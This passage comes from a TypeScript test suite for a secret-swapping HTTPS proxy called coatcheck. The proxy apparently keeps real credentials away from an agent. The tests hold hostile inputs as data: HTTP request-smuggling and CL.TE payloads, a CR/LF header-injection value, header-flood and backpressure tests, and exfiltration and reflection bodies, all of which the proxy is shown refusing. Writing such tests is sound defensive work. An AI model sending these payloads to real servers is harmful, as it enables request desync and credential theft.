    const t = await new Promise<tls.TLSSocket>((resolve, reject) => {
      // Trust both CAs; the issuer tells us which side terminated TLS.
      const sock = tls.connect({ socket, ca: [proxyCa.caCertPem, upstreamCa.caCertPem], host: '127.0.0.1' }, () => resolve(sock));
      sock.once('error', reject);
    });
    cleanups.push(() => { t.destroy(); });
    return issuerCn(t).includes('CN=proxy test CA') ? 'proxy' : 'upstream';
  }
  const loopbackPolicy = parsePolicy(JSON.stringify({ secrets: { k: { allowed_hosts: ['127.0.0.1'] } } }), []);

  it('bound (default): MITMs a policy host even before any ticket exists', async () => {
    const logs = captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ policy: loopbackPolicy });
    expect(await issuerSeen(port, upstream.port)).toBe('proxy');
    expect(logs).toContainEqual(expect.stringContaining('mode=mitm reason=policy'));
  });

  it('bound: MITMs a host on a live ticket, and only while one is live', async () => {
    const logs = captureLogs();
    const upstream = await startHttpsUpstream();
    const { tokenStore, port } = await startProxy();
    expect(await issuerSeen(port, upstream.port)).toBe('upstream');
    tokenStore.issue('k', 'v', { allowedHosts: hosts('127.0.0.1') });
    expect(await issuerSeen(port, upstream.port)).toBe('proxy');
    expect(logs).toContainEqual(expect.stringContaining('mode=mitm reason=ticket'));
  });

  it('bound: tunnels hosts no ticket is bound to, even while other tickets are live', async () => {
    captureLogs();
    const upstream = await startHttpsUpstream();
    const { tokenStore, port } = await startProxy();
    tokenStore.issue('github-token', 'v', { allowedHosts: hosts('api.github.com') });
    expect(await issuerSeen(port, upstream.port)).toBe('upstream');
  });

  it('bound: a live unbound ticket (COATCHECK_ALLOW_UNBOUND_SECRETS) MITMs every host', async () => {
    captureLogs();
    const upstream = await startHttpsUpstream();
    const { tokenStore, port } = await startProxy();
    tokenStore.issue('unbound', 'v');
    expect(await issuerSeen(port, upstream.port)).toBe('proxy');
  });

  it('bound: MITMs the browser adapter host when CDP is enabled', async () => {
    const logs = captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ cdp: { port: 8444, advertiseHost: '127.0.0.1' }, browserbaseApiHost: '127.0.0.1' });
    expect(await issuerSeen(port, upstream.port)).toBe('proxy');
    expect(logs).toContainEqual(expect.stringContaining('mode=mitm reason=adapter'));
  });

  it('always: MITMs every CONNECT', async () => {
    captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ mitm: 'always' });
    expect(await issuerSeen(port, upstream.port)).toBe('proxy');
  });

  it('passthrough hosts override both modes (cert-pinned clients)', async () => {
    const logs = captureLogs();
    const upstream = await startHttpsUpstream();
    const passthroughHosts = hosts('127.0.0.1');
    for (const mitm of ['bound', 'always'] as const) {
      const { tokenStore, port } = await startProxy({ mitm, passthroughHosts, policy: loopbackPolicy });
      tokenStore.issue('k', 'v', { allowedHosts: hosts('127.0.0.1') });
      expect(await issuerSeen(port, upstream.port), mitm).toBe('upstream');
    }
    expect(logs).toContainEqual(expect.stringContaining('mode=passthrough reason=passthrough-list'));
  });

  it('negotiates http/1.1 with an h2-capable client', async () => {
    captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ mitm: 'always' });
    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await new Promise<tls.TLSSocket>((resolve, reject) => {
      const sock = tls.connect({ socket, ca: proxyCa.caCertPem, host: '127.0.0.1', ALPNProtocols: ['h2', 'http/1.1'] }, () => resolve(sock));
      sock.once('error', reject);
    });
    expect(t.alpnProtocol).toBe('http/1.1');
    t.write('GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n');
    const [res] = await readResponses(t, 1);
    expect(res.head).toMatch(/^HTTP\/1\.1 200/);
  });

  it('turns the tunnel into a raw pipe after 101 Switching Protocols, so WebSockets work', async () => {
    captureLogs();
    const upstream = await startRawTlsUpstream();
    const { tokenStore, port } = await startProxy();
    const tok = tokenStore.issue('k', 'real-ws-key', { allowedHosts: hosts('127.0.0.1') }).id;

    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    expect(issuerCn(t)).toContain('CN=proxy test CA');
    // Frame bytes sent right behind the upgrade request are held until the 101.
    t.write(`GET /ws HTTP/1.1\r\nHost: 127.0.0.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nAuthorization: Bearer ${tok}\r\n\r\nearly`);
    const [res] = await readResponses(t, 1);
    expect(res.head).toMatch(/^HTTP\/1\.1 101 /);
    expect(upstream.heads[0]).toContain('Authorization: Bearer real-ws-key');

    // Binary-ish frames with no CRLFCRLF would stall an HTTP parser; a raw pipe echoes them.
    let echoed = res.body;
    const frame = '\x81\x05hello';
    t.write(frame);
    await new Promise<void>(resolve => {
      const onData = (d: Buffer) => { echoed += d.toString('latin1'); if (echoed.includes(frame)) { t.off('data', onData); resolve(); } };
      t.on('data', onData);
    });
    expect(echoed.startsWith('early')).toBe(true);
    expect(upstream.heads).toHaveLength(1);
  });

  it('keeps parsing (and swapping) when the upstream refuses an upgrade', async () => {
    captureLogs();
    const upstream = await startRawTlsUpstream();
    const { tokenStore, port } = await startProxy();
    const tok = tokenStore.issue('k', 'real-key', { allowedHosts: hosts('127.0.0.1') }).id;

    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write('GET /ws HTTP/1.1\r\nHost: 127.0.0.1\r\nUpgrade: h2c\r\nConnection: Upgrade\r\n\r\n');
    const [refused] = await readResponses(t, 1);
    expect(refused.head).toMatch(/^HTTP\/1\.1 426 /);
    t.write(`GET /next HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: ${tok}\r\n\r\n`);
    const [next] = await readResponses(t, 1);
    expect(next.body).toContain('X-Key: real-key');
  });
});

describe('coatcheck server: request framing', () => {
  async function tunnel() {
    const upstream = await startHttpsUpstream();
    const { tokenStore, port } = await startProxy({ mitm: 'always' });
    const tok = tokenStore.issue('k', 'real-key', { allowedHosts: hosts('127.0.0.1') }).id;
    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    return { upstream, tok, t };
  }

  it('frames chunked bodies, so ticket-shaped chunk data is never parsed as a request (desync attack)', async () => {
    captureLogs();
    const { upstream, tok, t } = await tunnel();
    // Chunk data holding a blank line and a header-looking ticket: the old
    // parser read a chunked request as bodiless, parsed this data as a new
    // "request", and swapped the ticket into what the upstream reads as the body.
    const data = `x\r\n\r\nX-Smuggled: ${tok}\r\n\r\n`;
    const chunk = `${Buffer.byteLength(data).toString(16)}\r\n${data}\r\n`;
    const responses = readResponses(t, 2);
    // Split mid-chunk to exercise the incomplete path.
    t.write(`POST /up HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\nX-Key: ${tok}\r\n\r\n${chunk.slice(0, 10)}`);
    await new Promise(r => setTimeout(r, 20));
    t.write(`${chunk.slice(10)}3;ext=1\r\nend\r\n0\r\n\r\n`);
    t.write(`GET /next HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: ${tok}\r\n\r\n`);
    const [r1, r2] = await responses;

    const e1 = JSON.parse(r1.body) as Echo;
    expect(e1.headers['x-key']).toBe('real-key');
    expect(e1.body).toBe(`${data}end`);
    expect(e1.body).not.toContain('real-key');
    expect((JSON.parse(r2.body) as Echo).headers['x-key']).toBe('real-key');
    expect(upstream.received.map(e => e.url)).toEqual(['/up', '/next']);
  });

  it.each([
    ['Content-Length and Transfer-Encoding (CL.TE smuggling)', 'Content-Length: 4\r\nTransfer-Encoding: chunked\r\n', '0\r\n\r\n'],
    ['a Transfer-Encoding other than chunked', 'Transfer-Encoding: gzip, chunked\r\n', '0\r\n\r\n'],
    ['repeated Transfer-Encoding', 'Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n', '0\r\n\r\n'],
    ['conflicting Content-Length', 'Content-Length: 1\r\nContent-Length: 4\r\n', 'abcd'],
    ['a non-numeric Content-Length', 'Content-Length: +4\r\n', 'abcd'],
    ['whitespace before the colon', 'Content-Length : 4\r\n', 'abcd'],
    ['an obs-fold line', 'X-A: 1\r\n  folded\r\n', ''],
    ['a malformed chunk size', 'Transfer-Encoding: chunked\r\n', 'zz\r\nabc\r\n0\r\n\r\n'],
    ['chunk data longer than its size', 'Transfer-Encoding: chunked\r\n', '2\r\nabcd\r\n0\r\n\r\n'],
  ])('refuses %s with 400 and closes the tunnel, forwarding nothing', async (_name, headers, body) => {
    captureLogs();
    const { upstream, tok, t } = await tunnel();
    const closed = new Promise<void>(r => t.once('close', () => r()));
    t.write(`POST /x HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: ${tok}\r\n${headers}\r\n${body}`);
    t.write(`GET /smuggled HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: ${tok}\r\n\r\n`);
    const [res] = await readResponses(t, 1);
    expect(res.head).toMatch(/^HTTP\/1\.1 400 /);
    expect(res.head).toMatch(/X-Coatcheck-Denied: bad-framing/i);
    await closed;
    expect(upstream.received).toEqual([]);
  });

  it('ignores empty lines before a request line (RFC 9112 §2.2)', async () => {
    captureLogs();
    const { upstream, tok, t } = await tunnel();
    const responses = readResponses(t, 2);
    // A stray CRLF after a body, as some clients send, must not be read as a request.
    t.write('POST /a HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 2\r\n\r\nhi\r\n');
    t.write(`GET /b HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: ${tok}\r\n\r\n`);
    const [, r2] = await responses;
    expect((JSON.parse(r2.body) as Echo).headers['x-key']).toBe('real-key');
    expect(upstream.received.map(e => e.url)).toEqual(['/a', '/b']);
  });

  it('matches Content-Length only as a whole header name', async () => {
    captureLogs();
    const { upstream, t } = await tunnel();
    const responses = readResponses(t, 2);
    t.write('GET /a HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Content-Length: 50\r\n\r\n');
    t.write('GET /b HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n');
    await responses;
    expect(upstream.received.map(e => e.url)).toEqual(['/a', '/b']);
  });
});

describe('coatcheck server: request body substitution', () => {
  // A value with characters that break JSON and forms, and `$` replacement patterns.
  const REAL = 'p"a&s s$&w\\rd';
  const policy = parsePolicy(JSON.stringify({
    secrets: {
      'body-key': { allowed_hosts: ['127.0.0.1', 'http://127.0.0.1'], swap_body: true },
      'header-key': { allowed_hosts: ['127.0.0.1', 'http://127.0.0.1'] },
      'github-token': { allowed_hosts: ['api.github.com'], swap_body: true },
      // The secret's in-band `_swap_body: false` wins over this.
      'opted-*': { allowed_hosts: ['127.0.0.1'], swap_body: true },
    },
  }), []);
  const provider = () => createMemoryProvider({
    secrets: {
      'body-key': REAL,
      'header-key': 'real-header-key',
      'github-token': 'ghp_REAL_VALUE',
      'opted-out': JSON.stringify({ value: 'real-opted-out', _allowed_hosts: ['127.0.0.1'], _swap_body: false }),
    },
  });

  async function mint(proxyPort: number, name: string) {
    const res = await fetch(`http://127.0.0.1:${proxyPort}/_vault/${name}`);
    expect(res.status).toBe(200);
    return await res.json() as { token: string; swap_body?: boolean };
  }

  async function tunnel(upstreamPort: number, proxyPort: number) {
    const { socket } = await connect(proxyPort, `127.0.0.1:${upstreamPort}`);
    return startTls(socket, proxyCa.caCertPem);
  }

  it('swaps an opted-in ticket in a JSON body over HTTPS, escaping it and rewriting Content-Length', async () => {
    captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ policy, provider: provider() });
    const minted = await mint(port, 'body-key');
    expect(minted.swap_body).toBe(true);

    const t = await tunnel(upstream.port, port);
    const body = JSON.stringify({ password: minted.token, note: 'kept' });
    t.write(`POST /login HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: ${Buffer.byteLength(body)}\r\n\r\n${body}`);
    const [res] = await readResponses(t, 1);
    const echo = JSON.parse(res.body) as Echo;
    expect(JSON.parse(echo.body!)).toEqual({ password: REAL, note: 'kept' });
    expect(Number(echo.headers['content-length'])).toBe(Buffer.byteLength(echo.body!));
  });

  it('swaps in a chunked form body, percent-encoding the value, and keeps the tunnel framed', async () => {
    captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ policy, provider: provider() });
    const { token } = await mint(port, 'body-key');

    const t = await tunnel(upstream.port, port);
    const form = `user=me&password=${token}`;
    const responses = readResponses(t, 2);
    t.write(`POST /form HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n` +
      `5\r\n${form.slice(0, 5)}\r\n${(form.length - 5).toString(16)}\r\n${form.slice(5)}\r\n0\r\n\r\n`);
    t.write('GET /next HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n');
    const [r1] = await responses;
    const echo = JSON.parse(r1.body) as Echo;
    expect(new URLSearchParams(echo.body).get('password')).toBe(REAL);
    expect(upstream.received.map(e => e.url)).toEqual(['/form', '/next']);
  });

  it.each([
    ['scanned: a body ticket is live for the host, so the body is buffered', true],
    ['streamed: no body ticket is live for the host', false],
  ])('never swaps a ticket into the body unless its secret opts in (reflection attack, %s)', async (_name, bodyTicketLive) => {
    const logs = captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ policy, provider: provider() });
    const headerKey = (await mint(port, 'header-key')).token;
    const optedOut = (await mint(port, 'opted-out')).token;
    if (bodyTicketLive) await mint(port, 'body-key');

    // An allowed host that echoes its input: a swapped body would hand the value back to the agent.
    const t = await tunnel(upstream.port, port);
    const body = `{"a":"${headerKey}","b":"${optedOut}"}`;
    t.write(`POST /echo HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: ${headerKey}\r\nContent-Type: application/json\r\nContent-Length: ${body.length}\r\n\r\n${body}`);
    const [res] = await readResponses(t, 1);
    expect(res.body).not.toContain('real-opted-out');
    const echo = JSON.parse(res.body) as Echo;
    expect(echo.headers['x-key']).toBe('real-header-key');
    expect(echo.body).toBe(body);
    if (bodyTicketLive) expect(logs).toContainEqual(expect.stringContaining('result=body-skipped secrets=header-key,opted-out'));
    expect(logs.join('\n')).not.toContain('real-header-key');
  });

  it('denies a body ticket bound to another host and forwards nothing (exfiltration attack)', async () => {
    captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ policy, provider: provider(), mitm: 'always' });
    const { token } = await mint(port, 'github-token');
    await mint(port, 'body-key'); // a body ticket live for this host: the body is scanned

    const t = await tunnel(upstream.port, port);
    const body = `{"stolen":"${token}"}`;
    t.write(`POST /collect HTTP/1.1\r\nHost: api.github.com\r\nContent-Type: application/json\r\nContent-Length: ${body.length}\r\n\r\n${body}`);
    const [res] = await readResponses(t, 1);
    expect(res.head).toMatch(/^HTTP\/1\.1 403 /);
    expect(res.head).toMatch(/X-Coatcheck-Denied: host-mismatch/i);
    expect(upstream.received).toEqual([]);
  });

  it('streams a body when no body ticket is live for the host: a mis-bound one leaves only as a literal', async () => {
    captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ policy, provider: provider(), mitm: 'always' });
    const { token } = await mint(port, 'github-token');

    const t = await tunnel(upstream.port, port);
    const body = `{"stolen":"${token}"}`;
    t.write(`POST /collect HTTP/1.1\r\nHost: api.github.com\r\nContent-Type: application/json\r\nContent-Length: ${body.length}\r\n\r\n${body}`);
    const [res] = await readResponses(t, 1);
    expect(res.body).not.toContain('ghp_REAL_VALUE');
    expect((JSON.parse(res.body) as Echo).body).toBe(body);
  });

  it('leaves content-encoded bodies alone', async () => {
    captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ policy, provider: provider() });
    const { token } = await mint(port, 'body-key');
    const t = await tunnel(upstream.port, port);
    t.write(`POST /z HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Encoding: br\r\nContent-Length: ${token.length}\r\n\r\n${token}`);
    const [res] = await readResponses(t, 1);
    expect((JSON.parse(res.body) as Echo).body).toBe(token);
  });

  it('swaps opted-in body tickets on the plain-HTTP forward path, and denies mis-bound ones', async () => {
    captureLogs();
    const upstream = await startHttpUpstream();
    const { port } = await startProxy({ policy, provider: provider() });
    const body = (await mint(port, 'body-key')).token;
    const header = (await mint(port, 'header-key')).token;
    const github = (await mint(port, 'github-token')).token;

    const post = (payload: string) => new Promise<number>((resolve, reject) => {
      const req = http.request({
        host: '127.0.0.1', port, method: 'POST', path: `http://127.0.0.1:${upstream.port}/p`,
        headers: { 'content-type': 'text/plain' },
      }, res => { res.resume(); res.on('end', () => resolve(res.statusCode ?? 0)); });
      req.on('error', reject);
      req.end(payload); // chunked: no Content-Length
    });

    expect(await post(`a=${body};b=${header}`)).toBe(200);
    expect(upstream.received[0].body).toBe(`a=${REAL};b=${header}`);
    expect(Number(upstream.received[0].headers['content-length'])).toBe(Buffer.byteLength(upstream.received[0].body!));
    expect(upstream.received[0].headers['transfer-encoding']).toBeUndefined();

    expect(await post(`x=${github}`)).toBe(403);
    expect(upstream.received).toHaveLength(1);
  });
});

describe('coatcheck server: swap-path hardening', () => {
  it('refuses a value with CR/LF in a header instead of injecting header lines (CL desync attack)', async () => {
    const logs = captureLogs();
    const upstream = await startHttpsUpstream();
    const { tokenStore, port } = await startProxy({ mitm: 'always' });
    const allowedHosts = hosts('127.0.0.1');
    // E.g. an access_token a hostile OAuth endpoint wrote back on refresh.
    const evil = tokenStore.issue('oauth:access_token', 'x\r\nContent-Length: 0\r\nX-Injected: 1', { allowedHosts }).id;

    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write(`POST /a HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Bearer ${evil}\r\nContent-Length: 4\r\n\r\nGET `);
    const [res] = await readResponses(t, 1);
    expect(res.head).toMatch(/^HTTP\/1\.1 403 /);
    expect(res.head).toMatch(/X-Coatcheck-Denied: invalid-value/i);
    expect(upstream.received).toEqual([]);
    expect(logs).toContainEqual(expect.stringContaining('result=invalid-value secrets=oauth:access_token'));
    expect(logs.join('\n')).not.toContain('X-Injected');
  });

  it('percent-encodes a value swapped into the MITM request line, so a space cannot split it', async () => {
    captureLogs();
    const upstream = await startHttpsUpstream();
    const { tokenStore, port } = await startProxy();
    const tok = tokenStore.issue('k', 'real value é HTTP/1.1', { allowedHosts: hosts('127.0.0.1') }).id;
    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write(`GET /p?k=${tok} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n`);
    const [res] = await readResponses(t, 1);
    expect((JSON.parse(res.body) as Echo).url).toBe('/p?k=real%20value%20%C3%A9%20HTTP/1.1');
  });

  it('answers 431 and closes the tunnel when a header section never ends (memory exhaustion)', async () => {
    captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ mitm: 'always' });
    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    const closed = new Promise<void>(r => t.once('close', () => r()));
    t.write(`GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Pad: ${'a'.repeat(70 * 1024)}`);
    const [res] = await readResponses(t, 1);
    expect(res.head).toMatch(/^HTTP\/1\.1 431 /);
    await closed;
    expect(upstream.received).toEqual([]);
  });

  it('streams a body when no body ticket is live: the upstream sees the head before the body ends', async () => {
    captureLogs();
    const upstream = await startRawTlsUpstream();
    const { tokenStore, port } = await startProxy();
    const tok = tokenStore.issue('k', 'real-key', { allowedHosts: hosts('127.0.0.1') }).id;
    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write(`POST /up HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: ${tok}\r\nContent-Length: 100000\r\n\r\n${'x'.repeat(1000)}`);
    await vi.waitFor(() => expect(upstream.heads).toHaveLength(1));
    expect(upstream.heads[0]).toContain('X-Key: real-key');
  });

  it.each([
    ['Content-Length', (b: string) => `Content-Length: ${b.length}\r\n\r\n${b}`],
    ['chunked', (b: string) => `Transfer-Encoding: chunked\r\n\r\n${[b.slice(0, 1500), b.slice(1500)].map(c => `${c.length.toString(16)}\r\n${c}\r\n`).join('')}0\r\n\r\n`],
  ])('streams a %s body past COATCHECK_MAX_SWAP_BODY_BYTES unscanned: the ticket stays a literal', async (_name, frame) => {
    const logs = captureLogs();
    const upstream = await startHttpsUpstream();
    const { tokenStore, port } = await startProxy({ maxSwapBodyBytes: 1024 });
    const tok = tokenStore.issue('k', 'real-key', { allowedHosts: hosts('127.0.0.1'), swapBody: true }).id;
    const body = `${'x'.repeat(2000)}${tok}`;
    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    const responses = readResponses(t, 2);
    t.write(`POST /big HTTP/1.1\r\nHost: 127.0.0.1\r\n${frame(body)}`);
    t.write(`POST /small HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: ${tok.length}\r\n\r\n${tok}`);
    const [big, small] = await responses;
    expect((JSON.parse(big.body) as Echo).body).toBe(body);
    expect((JSON.parse(small.body) as Echo).body).toBe('real-key');
    expect(logs).toContainEqual(expect.stringContaining('result=body-unscanned reason=too-large max_bytes=1024'));
  });

  it('forward path: refuses CR/LF values, and streams bodies past the cap unscanned', async () => {
    const logs = captureLogs();
    const upstream = await startHttpUpstream();
    const { tokenStore, port } = await startProxy({ maxSwapBodyBytes: 1024 });
    const allowedHosts = hosts('http://127.0.0.1');
    const tok = tokenStore.issue('k', 'real-key', { allowedHosts, swapBody: true }).id;
    const post = (payload: string) => new Promise<number>((resolve, reject) => {
      const req = http.request({ host: '127.0.0.1', port, method: 'POST', path: `http://127.0.0.1:${upstream.port}/p` },
        res => { res.resume(); res.on('end', () => resolve(res.statusCode ?? 0)); });
      req.on('error', reject);
      req.end(payload);
    });
    const big = `${'x'.repeat(3000)}${tok}`;
    expect(await post(big)).toBe(200);
    expect(upstream.received[0].body).toBe(big);
    expect(logs).toContainEqual(expect.stringContaining('scheme=http host=127.0.0.1 result=body-unscanned'));
    expect(await post(`a=${tok}`)).toBe(200);
    expect(upstream.received[1].body).toBe('a=real-key');
  });

  /** A TLS upstream that accepts connections but never reads from them. */
  async function startStalledUpstream() {
    const leaf = await upstreamCa.getCertForHost('127.0.0.1');
    const sockets: tls.TLSSocket[] = [];
    const server = tls.createServer({ key: leaf.key, cert: leaf.cert }, sock => {
      sockets.push(sock);
      sock.on('error', () => {});
      sock.pause();
    });
    await new Promise<void>(r => server.listen(0, '127.0.0.1', r));
    cleanups.push(() => new Promise<void>(r => { sockets.forEach(s => s.destroy()); server.close(() => r()); }));
    return (server.address() as AddressInfo).port;
  }

  /** Write `total` bytes without waiting; resolve with what the client still holds after the proxy had time to read. */
  async function unflushedAfter(t: tls.TLSSocket, total: number): Promise<number> {
    const chunk = Buffer.alloc(64 * 1024, 0x78);
    for (let sent = 0; sent < total; sent += chunk.length) t.write(chunk);
    await new Promise(r => setTimeout(r, 1500));
    return t.writableLength;
  }

  // Sizes: well past socket buffers, and small enough that without flow
  // control coatcheck reads it all within the wait.
  it.each([
    ['a streamed upload to an upstream that stops reading', 48 * 1024 * 1024, (len: number) =>
      `POST /up HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: ${len}\r\n\r\n`],
    ['bytes sent while an upgrade is pending', 8 * 1024 * 1024, () =>
      'GET /ws HTTP/1.1\r\nHost: 127.0.0.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n'],
  ])('applies backpressure to %s instead of buffering it (memory exhaustion)', async (_name, total, head) => {
    captureLogs();
    const upstreamPort = await startStalledUpstream();
    const { port } = await startProxy({ mitm: 'always' });
    const { socket } = await connect(port, `127.0.0.1:${upstreamPort}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write(head(total));
    // Without flow control coatcheck reads all of it into memory and the
    // client's buffer drains; with it, most of it stays with the client.
    expect(await unflushedAfter(t, total)).toBeGreaterThan(total / 2);
  }, 20_000);

  it('applies swap_body from a shared secret\'s policy entry', async () => {
    captureLogs();
    const policy = parsePolicy(JSON.stringify({
      shared: { 'shared-key': { allowed_hosts: ['127.0.0.1'], swap_body: true } },
    }), []);
    const { port } = await startProxy({ policy, provider: createMemoryProvider({ shared: { 'shared-key': 'real-shared' } }) });
    const res = await fetch(`http://127.0.0.1:${port}/_secret/shared-key`);
    expect(await res.json()).toMatchObject({ swap_body: true, allowed_hosts: ['127.0.0.1'] });
  });
});

describe('coatcheck server: API token', () => {
  const TOKEN = 'test-api-token-0123456789abcdef0123456789';
  const basic = (user: string, pass: string) => `Basic ${Buffer.from(`${user}:${pass}`).toString('base64')}`;
  const provider = () => createMemoryProvider({ secrets: { 'github-token': 'ghp_REAL_VALUE' } });
  const policy = parsePolicy(JSON.stringify({ secrets: { 'github-token': { allowed_hosts: ['api.github.com'] } } }), []);

  /** CONNECT with optional extra header lines; resolves with the status line. */
  function connectWith(proxyPort: number, target: string, extra = ''): Promise<{ status: string; socket: net.Socket }> {
    return new Promise((resolve, reject) => {
      const socket = net.connect(proxyPort, '127.0.0.1', () => {
        socket.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n${extra}\r\n`);
      });
      cleanups.push(() => { socket.destroy(); });
      socket.once('data', d => resolve({ status: d.toString().split('\r\n')[0], socket }));
      socket.once('error', reject);
    });
  }

  it('refuses to mint tickets without the bearer token (the open-listener attack)', async () => {
    captureLogs();
    const { tokenStore, port } = await startProxy({ provider: provider(), policy, apiToken: TOKEN });
    const attempts: Array<[string, RequestInit]> = [
      ['/_vault/github-token', {}],
      ['/_vault/github-token', { headers: { authorization: 'Bearer wrong-token-0123456789abcdef0123456789' } }],
      ['/_vault/github-token', { headers: { authorization: TOKEN } }], // no scheme
      ['/_vault/github-token', { headers: { 'proxy-authorization': `Bearer ${TOKEN}` } }], // wrong header
      ['/_vault', {}],
      ['/_vault/github-token?check=1', {}],
      ['/_vault/mint-tokens', { method: 'POST', body: '{"secretName":"github-token","sessionId":"s"}' }],
      ['/_vault/github-token/refresh', { method: 'POST' }],
      ['/_secret/github-token', {}],
    ];
    for (const [path, init] of attempts) {
      const res = await fetch(`http://127.0.0.1:${port}${path}`, init);
      expect(res.status, path).toBe(401);
      expect(res.headers.get('www-authenticate')).toBe('Bearer realm="coatcheck"');
    }
    expect(tokenStore.size).toBe(0);

    const ok = await fetch(`http://127.0.0.1:${port}/_vault/github-token`, { headers: { authorization: `Bearer ${TOKEN}` } });
    expect(ok.status).toBe(200);
    expect(tokenStore.size).toBe(1);
  });

  it('keeps /_health and /_ca open for probes and CA bootstrap', async () => {
    const { port } = await startProxy({ apiToken: TOKEN });
    expect((await fetch(`http://127.0.0.1:${port}/_health`)).status).toBe(200);
    expect(await (await fetch(`http://127.0.0.1:${port}/_ca`)).text()).toBe(proxyCa.caCertPem);
  });

  it('refuses CONNECT without proxy credentials, before dialling the upstream', async () => {
    const logs = captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ apiToken: TOKEN, mitm: 'always' });
    for (const extra of ['', `Proxy-Authorization: ${basic('coatcheck', 'wrong')}\r\n`, `Authorization: Bearer ${TOKEN}\r\n`]) {
      const { status } = await connectWith(port, `127.0.0.1:${upstream.port}`, extra);
      expect(status, extra).toBe('HTTP/1.1 407 Proxy Authentication Required');
    }
    expect(upstream.connections()).toBe(0);
    expect(logs).toContainEqual(expect.stringContaining('[auth] rejected CONNECT'));
    expect(logs.join('\n')).not.toContain(TOKEN);

    // Basic with the token as password (what curl/requests send for http://user:token@proxy), or Bearer.
    for (const header of [basic('coatcheck', TOKEN), basic('', TOKEN), `Bearer ${TOKEN}`]) {
      const { status } = await connectWith(port, `127.0.0.1:${upstream.port}`, `Proxy-Authorization: ${header}\r\n`);
      expect(status, header).toBe('HTTP/1.1 200 Connection Established');
    }
  });

  it('refuses forward requests without proxy credentials and never forwards the credential', async () => {
    captureLogs();
    const upstream = await startHttpUpstream();
    const { port } = await startProxy({ apiToken: TOKEN });
    const denied = await viaProxy(port, `http://127.0.0.1:${upstream.port}/`);
    expect(denied.status).toBe(407);
    expect(denied.headers['proxy-authenticate']).toBe('Basic realm="coatcheck"');
    expect(upstream.received).toHaveLength(0);

    const ok = await viaProxy(port, `http://127.0.0.1:${upstream.port}/`, { 'proxy-authorization': basic('coatcheck', TOKEN) });
    expect(ok.status).toBe(200);
    expect(upstream.received[0].headers).not.toHaveProperty('proxy-authorization');
  });
});

describe('coatcheck server: plain HTTP', () => {
  it('forwards requests and swaps tickets in the URL and headers', async () => {
    const received: Echo[] = [];
    const upstream = http.createServer((req, res) => {
      received.push({ url: req.url ?? '', headers: req.headers });
      res.end('ok');
    });
    await new Promise<void>(r => upstream.listen(0, '127.0.0.1', r));
    cleanups.push(() => new Promise<void>(r => upstream.close(() => r())));
    const upPort = (upstream.address() as AddressInfo).port;

    const { tokenStore, port } = await startProxy();
    const tok = tokenStore.issue('api-key', 'real-api-key').id;

    const status = await new Promise<number>((resolve, reject) => {
      const req = http.request({
        host: '127.0.0.1', port, method: 'GET',
        path: `http://127.0.0.1:${upPort}/p?key=${tok}`,
        headers: { authorization: `Bearer ${tok}` },
      }, res => { res.resume(); res.on('end', () => resolve(res.statusCode ?? 0)); });
      req.on('error', reject);
      req.end();
    });

    expect(status).toBe(200);
    expect(received[0].url).toBe('/p?key=real-api-key');
    expect(received[0].headers.authorization).toBe('Bearer real-api-key');
  });

  it('strips proxy-authorization and hop-by-hop headers', async () => {
    const upstream = await startHttpUpstream();
    const { port } = await startProxy();
    const res = await viaProxy(port, `http://127.0.0.1:${upstream.port}/`, {
